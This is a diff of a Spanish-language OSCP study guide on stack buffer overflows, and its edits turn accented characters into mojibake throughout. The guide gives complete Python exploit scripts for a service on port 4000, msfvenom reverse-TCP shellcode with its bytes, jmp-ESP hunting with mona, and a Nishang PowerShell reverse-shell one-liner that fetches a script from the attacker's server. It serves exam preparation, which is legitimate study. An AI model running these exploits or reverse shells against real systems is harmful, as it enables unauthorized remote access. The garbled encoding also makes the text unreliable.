@@ -321,7 +320,7 @@ $~ echo "\0x39\0x42\0x62\0x30" | xxd -ps -r
 
 ```
 
-Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a través del **pattern_offset** de Metasploit calcular el offset, permitiéndonos así conocer ya el tamaño del buffer previo a la sobreescritura del registro EIP:
+Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a travÃ©s del **pattern_offset** de Metasploit calcular el offset, permitiÃ©ndonos asÃ­ conocer ya el tamaÃ±o del buffer previo a la sobreescritura del registro EIP:
 
 ```bash
 $~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0
@@ -331,7 +330,7 @@ $~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0
 
 #### Controlando el registro EIP
 
-Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).
+Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente direcciÃ³n a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecuciÃ³n alternativa del servicio a nivel de sistema (lo veremos mÃ¡s adelante).
 
 Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:
 
@@ -342,7 +341,7 @@ Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 buffer = "A"*809 + "B"*4 + "C"*(900-809-4)
@@ -352,7 +351,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -360,24 +359,24 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
 
 El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).
 
-Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.
+Tras la ejecuciÃ³n del script, desde el **Immunity Debugger** veremos que una vez se produce la violaciÃ³n de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.
 
 #### Situando y Asignando Espacio al Shellcode
 
-A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.
+A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podrÃ­a decir que nuestro shellcode tendrÃ­a que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayorÃ­a de las veces para entablar una conexiÃ³n reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.
 
-La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo así), si vemos que el registro **EIP** ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.
+La idea aquÃ­, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo asÃ­), si vemos que el registro **EIP** ya no vale lo que deberÃ­a, tendremos que ver hasta quÃ© tamaÃ±o podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.
 
-Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.
+Hay casos como el de Linux que explicarÃ© donde sÃ³lo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a travÃ©s de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiÃ©ndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.
 
-Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:
+Pero para el caso, y de cara a la examinaciÃ³n... no habrÃ¡ que preocuparse. Modificamos para ello el script de la siguiente forma:
 
 ```python
 #!/usr/bin/python
@@ -386,7 +385,7 @@ Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Mod
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 buffer = "A"*809 + "B"*4 + "C"*(1300-809-4)
@@ -396,7 +395,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -404,19 +403,19 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
-En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serán situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.
+En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serÃ¡n situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.
 
 #### Detectando los Badchars
 
-Esta será la única complicación del examen, y cuando digo complicación la sitúo entre comillas gestualmente hablando. 
+Esta serÃ¡ la Ãºnica complicaciÃ³n del examen, y cuando digo complicaciÃ³n la sitÃºo entre comillas gestualmente hablando. 
 
-A la hora de generar nuestro Shellcode, existen ciertos caracteres que en función del servicio con el que estemos tratando no son aceptados, causando una ejecución errónea de las instrucciones que pretendamos inyectar a nivel de sistema.
+A la hora de generar nuestro Shellcode, existen ciertos caracteres que en funciÃ³n del servicio con el que estemos tratando no son aceptados, causando una ejecuciÃ³n errÃ³nea de las instrucciones que pretendamos inyectar a nivel de sistema.
 
-Detectar estos caracteres no es nada complejo, lo único que necesitamos es una estructura como la siguiente:
+Detectar estos caracteres no es nada complejo, lo Ãºnico que necesitamos es una estructura como la siguiente:
 
 `"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -435,7 +434,7 @@ Detectar estos caracteres no es nada complejo, lo único que necesitamos es una 
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`
 
-A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:
+A fin de detectar cuÃ¡les de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:
 
 ```python
 #!/usr/bin/python
@@ -444,7 +443,7 @@ A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, 
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -471,7 +470,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -479,20 +478,20 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
 
-Desde **Immunity Debugger**, tras la ejecución del script podremos ver una vez se produce el desbordamiento del búfer los valores que están siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquí es caracter que no veamos, caracter que debemos desechar en el envío de nuestros badchars.
+Desde **Immunity Debugger**, tras la ejecuciÃ³n del script podremos ver una vez se produce el desbordamiento del bÃºfer los valores que estÃ¡n siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquÃ­ es caracter que no veamos, caracter que debemos desechar en el envÃ­o de nuestros badchars.
 
-Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varían en función del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genérico y siempre debe ser omitido a la hora de generar nuestro Shellcode.
+Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varÃ­an en funciÃ³n del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genÃ©rico y siempre debe ser omitido a la hora de generar nuestro Shellcode.
 
-Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo único que nos queda ya es generar nuestro Shellcode. 
+Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo Ãºnico que nos queda ya es generar nuestro Shellcode. 
 
 #### Generando el Shellcode
 
-El shellcode que se generará a continuación, lo que nos hará será entablar una conexión TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:
+El shellcode que se generarÃ¡ a continuaciÃ³n, lo que nos harÃ¡ serÃ¡ entablar una conexiÃ³n TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:
 
 ```
 $~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
@@ -529,7 +528,7 @@ unsigned char buf[] =
 "\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
 "\xc0\x8a\x41\xbe\xe1\x9e"
 ```
-Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente forma:
+Una vez generado el shellcode, lo aÃ±adimos a nuestro script de la siguiente forma:
 
 ```python
 #!/usr/bin/python
@@ -538,7 +537,7 @@ Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente for
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
@@ -573,7 +572,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -581,29 +580,29 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
-La razón por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucción a instrucción cómo se va produciendo el proceso de decodificación, así como probar a no insertar los NOP-sled a fin de corroborar como la ejecución de nuestro Shellcode no es funcional.
+La razÃ³n por la cual se han insertado los **NOP-sled** (\x90) antes de nuestro Shellcode, es porque el Shellcode necesita un margen de espacio para ser decodificado antes de ser interpretado, pues hemos usado el encoder x86/shikata_ga_nai. Una buena practica es aprovechar el **Immunity Debugger** para analizar instrucciÃ³n a instrucciÃ³n cÃ³mo se va produciendo el proceso de decodificaciÃ³n, asÃ­ como probar a no insertar los NOP-sled a fin de corroborar como la ejecuciÃ³n de nuestro Shellcode no es funcional.
 
-Ya teniendo todo esto hecho, lo único que queda es encontrar una dirección de salto al registro ESP.
+Ya teniendo todo esto hecho, lo Ãºnico que queda es encontrar una direcciÃ³n de salto al registro ESP.
 
 #### Salto al ESP
 
-Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecución exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitúa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.
+Llegando casi al final, para redirigir el flujo del programa y conseguir una ejecuciÃ³n exitosa de nuestro Shellcode, dado que nuestro Shellcode se sitÃºa en el registro **ESP** por un lado y dado que tenemos el control del registro **EIP** por otro... la idea es hacer que el registro **EIP** apunte hacia el registro **ESP**.
 
-Para ello, no es tan simple como especificar en _Little Endian_ la dirección del registro **ESP**, pues no funcionará. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una dirección de la memoria con permisos de ejecución y **ASLR** desactivado donde se aplique una instrucción de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha dirección, que la siguiente instrucción a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.
+Para ello, no es tan simple como especificar en _Little Endian_ la direcciÃ³n del registro **ESP**, pues no funcionarÃ¡. Lo que tendremos que hacer es lograr que el registro EIP apunte hacia una direcciÃ³n de la memoria con permisos de ejecuciÃ³n y **ASLR** desactivado donde se aplique una instrucciÃ³n de tipo '**jmp ESP**'. De esta forma, conseguiremos tras apuntar a dicha direcciÃ³n, que la siguiente instrucciÃ³n a realizar corresponda a los **NOP's** iniciales del registro **ESP** hasta llegar a nuestro **Shellcode**.
 
-Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la línea de comandos interactiva de la herramienta:
+Para ello, lo que tendremos que hacer una vez sincronizados al proceso desde **Immunity Debugger**, es aplicar el siguiente comando en la lÃ­nea de comandos interactiva de la herramienta:
 
 `!mona modules`
 
-Una vez hecho, se nos listarán un puñado de módulos, de entre los cuales deberemos buscar cuáles no poseen mecanismos de protección y tienen el ASLR desactivado. Para la examinación del OSCP, siempre habrá uno que reúna dichas condiciones.
+Una vez hecho, se nos listarÃ¡n un puÃ±ado de mÃ³dulos, de entre los cuales deberemos buscar cuÃ¡les no poseen mecanismos de protecciÃ³n y tienen el ASLR desactivado. Para la examinaciÃ³n del OSCP, siempre habrÃ¡ uno que reÃºna dichas condiciones.
 
-Tras encontrar el módulo, desde las pestañas superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del módulo en la memoria tiene permisos de ejecución, en caso de ser así, el módulo seleccionado es un candidato perfecto.
+Tras encontrar el mÃ³dulo, desde las pestaÃ±as superiores en **Immunity Debugger** (las letras iniciales), una de ellas nos permite visualizar si el campo _.text_ del mÃ³dulo en la memoria tiene permisos de ejecuciÃ³n, en caso de ser asÃ­, el mÃ³dulo seleccionado es un candidato perfecto.
 
-La idea una vez teniendo el módulo candidato, es ver en qué porción de la memoria se está aplicando un salto al registro ESP. Para realizar esta búsqueda, analizamos el equivalente OPCode de la instrucción haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:
+La idea una vez teniendo el mÃ³dulo candidato, es ver en quÃ© porciÃ³n de la memoria se estÃ¡ aplicando un salto al registro ESP. Para realizar esta bÃºsqueda, analizamos el equivalente OPCode de la instrucciÃ³n haciendo uso para ello de la utilidad **nasm_shell.rb** de Metasploit:
 
 ```bash
 $~ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
@@ -614,13 +613,13 @@ nasm >
 
 ```
 
-Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuación desde Mona en la línea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la sección de módulos:
+Sabiendo que a nivel de OPCode, un '**jmp ESP**' figura como **FFE4**, podemos a continuaciÃ³n desde Mona en la lÃ­nea de comandos interactiva de **Immunity Debugger** realizar la siguiente consulta en la secciÃ³n de mÃ³dulos:
 
 `find -s "\xff\xe4" -m modulo.dll`
 
-Suponiendo que se trata de una dll el módulo candidato que hemos encontrado. De manera inmediata, se nos datarán un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya dirección de memoria no posea badchars.
+Suponiendo que se trata de una dll el mÃ³dulo candidato que hemos encontrado. De manera inmediata, se nos datarÃ¡n un listado de resultados, donde de entre ellos... deberemos seleccionar aquel cuya direcciÃ³n de memoria no posea badchars.
 
-Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha dirección equivale a un jmp ESP. A modo de ejemplo, suponiendo que la dirección es **0x12131415**, se deberían de aplicar al script los siguientes cambios:
+Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **Immunity Debugger** como dicha direcciÃ³n equivale a un jmp ESP. A modo de ejemplo, suponiendo que la direcciÃ³n es **0x12131415**, se deberÃ­an de aplicar al script los siguientes cambios:
 
 ```python
 #!/usr/bin/python
@@ -629,7 +628,7 @@ Haciendo doble-click en la misma, podremos ver desde la interfaz principal de **
 import sys,socket
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
@@ -664,7 +663,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -672,20 +671,20 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
 
-Consiguiendo así que el registro **EIP** apunte a dicha dirección donde posteriormente se aplica el salto al registro **ESP**.
+Consiguiendo asÃ­ que el registro **EIP** apunte a dicha direcciÃ³n donde posteriormente se aplica el salto al registro **ESP**.
 
-Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:
+Una manera mÃ¡s elegante y opcional de hacer las cosas es importando la siguiente librerÃ­a en el script:
 
 ```python
 from struct import pack
 ```
 
-La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:
+La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una direcciÃ³n pasada directamente sin tener que estar haciendo la conversiÃ³n manualmente. Para ello, se deberÃ­a adaptar el script a lo que se muestra a continuaciÃ³n:
 
 ```python
 #!/usr/bin/python
@@ -695,7 +694,7 @@ import sys,socket
 from struct import pack
 
 if len(sys.argv) != 2:
-  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  print "\nUso: python" + sys.argv[0] + " <direcciÃ³n-ip>\n"
   sys.exit(0)
 
 shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
@@ -730,7 +729,7 @@ ipAddress = sys.argv[1]
 port = 4000
 
 try:
-  print "Enviando búffer..."
+  print "Enviando bÃºffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ipAddress, port))
   s.recv(1024)
@@ -738,45 +737,45 @@ try:
   s.recv(1024)
   s.close()
 except:
-  print "\nError de conexión...\n"
+  print "\nError de conexiÃ³n...\n"
   sys.exit(0)
 
 ```
 
-Podemos establecer **BreakPoints** desde Immunity Debugger en dicha dirección (pulsando **F2** para ello sobre la dirección), a fin de corroborar que se produce una detención en la ejecución del programa tras el registro **EIP** pasar por la dirección **0x12131415**. En caso de ser así, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucción a realizar corresponde al primer **NOP-sled** del registro **ESP**.
+Podemos establecer **BreakPoints** desde Immunity Debugger en dicha direcciÃ³n (pulsando **F2** para ello sobre la direcciÃ³n), a fin de corroborar que se produce una detenciÃ³n en la ejecuciÃ³n del programa tras el registro **EIP** pasar por la direcciÃ³n **0x12131415**. En caso de ser asÃ­, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucciÃ³n a realizar corresponde al primer **NOP-sled** del registro **ESP**.
 
-Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.
+Ya con todo esto hecho, tras la ejecuciÃ³n del exploit teniendo una sesiÃ³n de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesiÃ³n, en caso de volver a ejecutar el script... no ganaremos mÃ¡s veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.
 
 
 #### Mejorando el Exploit
 
-De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:
+De forma opcional, en caso de querer tras la ejecuciÃ³n del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo Ãºnico que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:
 
 ```
 $~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
 ```
-De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.
+De esta forma, variamos la funciÃ³n de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrÃ¡ el mismo tamaÃ±o (351 bytes), lo Ãºnico que habrÃ¡ que hacer serÃ¡ sutituir el Shellcode por el nuevo generado desde msfvenom.
 
-Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.
+Tras su ejecuciÃ³n, se podrÃ¡ comprobar como independientemente del nÃºmero de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.
 
-En caso de querer mejorar un pelín más nuestro script, contamos con otra vía de tratar los 16 **NOPs** que hemos insertado al principio del registro **ESP**. Se suele considerar más óptimo insertar al principio del registro **ESP** el siguiente Opcode en vez de los **NOPs**, seguidamente continuando con el Shellcode:
+En caso de querer mejorar un pelÃ­n mÃ¡s nuestro script, contamos con otra vÃ­a de tratar los 16 **NOPs** que hemos insertado al principio del registro **ESP**. Se suele considerar mÃ¡s Ã³ptimo insertar al principio del registro **ESP** el siguiente Opcode en vez de los **NOPs**, seguidamente continuando con el Shellcode:
 
 ```bash
-┌─[root@parrot]─[/var/www/html]
-└──╼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+â”Œâ”€[root@parrot]â”€[/var/www/html]
+â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
 nasm > sub esp,0x10
 00000000  83EC10            sub esp,byte +0x10
 ```
 
-Insertamos al principio del registro **ESP** el Opcode "**\x83\xEC\x10**", continuando con el Shellcode. Se considera más óptimo, pues dicha instrucción arrastra el **ESP** lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar **NOPs** hasta que validemos manualmente que rule (calculando offsets). 
+Insertamos al principio del registro **ESP** el Opcode "**\x83\xEC\x10**", continuando con el Shellcode. Se considera mÃ¡s Ã³ptimo, pues dicha instrucciÃ³n arrastra el **ESP** lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar **NOPs** hasta que validemos manualmente que rule (calculando offsets). 
 
-Lo bueno de esta técnica a su vez es que siempre funciona (¿Habrá que tener en cuenta los badchars?, habrá que investigar).
+Lo bueno de esta tÃ©cnica a su vez es que siempre funciona (Â¿HabrÃ¡ que tener en cuenta los badchars?, habrÃ¡ que investigar).
 
 #### Reduciendo el Size y Acceso por Powershell
 
-En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.
+En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeÃ±o truco que obtuve haciendo pruebas para reducir el tamaÃ±o de nuestro Shellcode.
 
-La idea para este caso, va a ser obtener una sesión reversa TCP vía **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:
+La idea para este caso, va a ser obtener una sesiÃ³n reversa TCP vÃ­a **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultarÃ­a tedioso transferir el script, posteriormente dar una instrucciÃ³n de importaciÃ³n y luego otra de invocaciÃ³n... lo que haremos serÃ¡ hacerlo todo de una, aÃ±adiendo en la Ãºltima lÃ­nea del script el siguiente contenido:
 
 `Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`
 
@@ -810,14 +809,14 @@ unsigned char buf[] =
 "\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15";
 ```
 
-Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.
+Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vÃ­a Python en el puerto 8000 (para que desde la mÃ¡quina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesiÃ³n de escucha vÃ­a Netcat por el puerto 443.
 
-Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.
+Inmediatamente tras ejecutar el script, veremos cÃ³mo se recibe un GET desde nuestro servidor web vÃ­a Python y cÃ³mo en cuestiÃ³n de segundos ganamos acceso al sistema vÃ­a Powershell.
 
 Buffer Overflow Linux
 ===============================================================================================================================
 
-Hasta donde yo se, no es común que caiga un _Buffer Overflow_ de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo **Crossfire**.
+Hasta donde yo se, no es comÃºn que caiga un _Buffer Overflow_ de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo **Crossfire**.
 
 #### Fuzzing
 
@@ -881,7 +880,7 @@ except:
 	sys.exit(0)
 ```
 
-Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaño del buffer el programa crasheará de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operación que hagamos tener bien calculados los tamaños.
+Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaÃ±o del buffer el programa crashearÃ¡ de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operaciÃ³n que hagamos tener bien calculados los tamaÃ±os.
 
 Para empezar, iniciamos **edb** con el programa corriendo, de la siguiente forma:
 
@@ -896,21 +895,21 @@ The debugged application encountered a segmentation fault.
 The address 0x41414141 does not appear to be mapped.
 ```
 
-Lo cual está genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la sección _Registers_ del aplicativo. Llegados a este punto, calculamos el Offset a continuación a fin de corroborar si efectivamente podemos tomar el control del **EIP**, mandando para ello 4 bytes correspondientes al caracter _B_ posteriormente.
